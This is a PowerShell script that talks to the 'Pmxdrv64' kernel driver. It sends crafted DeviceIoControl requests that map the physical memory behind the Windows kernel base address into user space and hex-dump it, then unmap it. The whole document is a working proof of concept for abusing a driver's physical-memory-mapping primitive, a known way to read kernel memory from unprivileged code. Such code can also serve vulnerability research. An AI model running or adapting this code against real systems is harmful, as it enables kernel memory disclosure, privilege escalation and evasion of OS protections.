Clear-Host
Write-Host

$hDevice = Get-FileHandle -FileName Pmxdrv64 -AlternativeName Pmxdrv -Symbolic 'Device'
$VA      = Get-KernelBaseAddress
$PA      = Convert-VirtualToPhysical -VirtualAddress $VA

# Configuration
$BytesToMap    = 96
$MappedAddress = 0

# ====================================================
# 1. MAP THE PHYSICAL MEMORY
# ====================================================

try {

    $PacketSize = 24
    $TargetPA = $PA
    $bHack = $false
    if ($TargetPA -eq 0) {
        $bHack = $true
        $TargetPA = 1
    }

    $PacketBytes = New-Object Byte[] $PacketSize
    [System.BitConverter]::GetBytes([Int32]$PacketSize).CopyTo($PacketBytes, 0)
    [System.BitConverter]::GetBytes([Int64]$TargetPA).CopyTo($PacketBytes, 4)
    [System.BitConverter]::GetBytes([Int32]$BytesToMap).CopyTo($PacketBytes, 12)
    [System.BitConverter]::GetBytes([Int64]0).CopyTo($PacketBytes, 16)

    $PacketPtr = [Marshal]::AllocHGlobal($PacketSize)
    [Marshal]::Copy($PacketBytes, 0, $PacketPtr, $PacketSize)

    $InputBufferSize = 16
    $ComputedInputSize = $InputBufferSize + $PacketSize

    $InputBufferBytes = New-Object Byte[] $InputBufferSize
    [System.BitConverter]::GetBytes([Int64]$PacketPtr).CopyTo($InputBufferBytes, 0)
    [System.BitConverter]::GetBytes([Int32]$ComputedInputSize).CopyTo($InputBufferBytes, 8)
    [System.BitConverter]::GetBytes([Int32]0).CopyTo($InputBufferBytes, 12)

    $InOutPtr = [Marshal]::AllocHGlobal($InputBufferSize)
    [Marshal]::Copy($InputBufferBytes, 0, $InOutPtr, $InputBufferSize)
    $RetBytes = [Marshal]::AllocHGlobal(8)

    # Fire Map IOCTL
    $hr = $NtApi::DeviceIoControl($hDevice, 0x00222AB8, $InOutPtr, $InputBufferSize, [IntPtr]::Zero, 0, $RetBytes, [IntPtr]::Zero)

    if (-not [Bool]$hr) {
        throw "DeviceIoControl Map failed."
    }

    [Marshal]::Copy($PacketPtr, $PacketBytes, 0, $PacketSize)
    $MappedAddress = [System.BitConverter]::ToInt64($PacketBytes, 16)
    
    # Compute the usable virtual pointer (applying alignment adjustments if $bHack is active)
    $MappedVirtualAddress = $MappedAddress
    if ($bHack) {
        $OffsetHack = $TargetPA -band 0xFFF
        $MappedVirtualAddress = $MappedVirtualAddress - $OffsetHack
    }
    
    Format-HexView -Address $MappedVirtualAddress -Size 96 -Mode 16x

} catch {
    Write-Error $_
} finally {
    Free-IntPtr $PacketPtr
    Free-IntPtr $InOutPtr
    Free-IntPtr $RetBytes

    $PacketPtr = 0
    $InOutPtr  = 0
    $RetBytes  = 0
}

# ====================================================
# 2. UNMAP THE MEMORY (CLEANUP)
# ====================================================

if ($MappedAddress -ne 0) {
    try {
        $UnmapPacketSize = 24
        $UnmapPacketBytes = New-Object Byte[] $UnmapPacketSize

        [System.BitConverter]::GetBytes([Int32]$UnmapPacketSize).CopyTo($UnmapPacketBytes, 0)
        [System.BitConverter]::GetBytes([Int64]0).CopyTo($UnmapPacketBytes, 4)
        [System.BitConverter]::GetBytes([Int64]$MappedAddress).CopyTo($UnmapPacketBytes, 16)

        $UnmapPacketPtr = [Marshal]::AllocHGlobal($UnmapPacketSize)
        [Marshal]::Copy($UnmapPacketBytes, 0, $UnmapPacketPtr, $UnmapPacketSize)

        $InputBufferSize = 16
        $ComputedInputSize = $InputBufferSize + $UnmapPacketSize

        $InputBufferBytes = New-Object Byte[] $InputBufferSize
        [System.BitConverter]::GetBytes([Int64]$UnmapPacketPtr).CopyTo($InputBufferBytes, 0)
        [System.BitConverter]::GetBytes([Int32]$ComputedInputSize).CopyTo($InputBufferBytes, 8)
        [System.BitConverter]::GetBytes([Int32]0).CopyTo($InputBufferBytes, 12)

        $InOutPtr = [Marshal]::AllocHGlobal($InputBufferSize)
        [Marshal]::Copy($InputBufferBytes, 0, $InOutPtr, $InputBufferSize)
        $RetBytes = [Marshal]::AllocHGlobal(8)

        $hr = $NtApi::DeviceIoControl($hDevice, 0x00222ABC, $InOutPtr, $InputBufferSize, [IntPtr]::Zero, 0, $RetBytes, [IntPtr]::Zero)
        if (-not [Bool]$hr) {
            Write-Error "DeviceIoControl Unmap failed."
        }
    } finally {
        Free-IntPtr $UnmapPacketPtr
        Free-IntPtr $InOutPtr
        Free-IntPtr $RetBytes

        $UnmapPacketPtr = 0
        $InOutPtr       = 0
        $RetBytes       = 0
    }
}

Free-IntPtr $hDevice -Method NtHandle